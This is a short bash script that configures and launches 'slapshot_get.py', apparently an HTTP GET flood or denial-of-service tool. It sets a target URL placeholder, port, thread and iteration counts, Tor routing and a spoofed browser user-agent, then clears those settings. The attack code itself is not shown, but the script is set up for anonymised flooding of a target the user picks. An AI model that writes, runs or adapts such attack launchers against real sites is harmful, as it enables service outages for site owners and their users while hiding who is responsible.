#/bin/bash
export TARGET_URL='<enter target>'
export TARGET_PORT=80
export NUM_THREADS=10
export NUM_ITERATIONS=100
export TOR=TRUE
export SLEEP_TIMER=0.05
export USER_AGENT_PAYLOAD='Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/601.3.9 (KHTML, like Gecko) Version/9.0.2 Safari/601.3.9'
python slapshot_get.py
unset TARGET_URL
unset TARGET_PORT
unset NUM_THREADS
unset NUM_ITERATIONS
unset TOR
unset SLEEP_TIMER
unset USER_AGENT_PAYLOAD
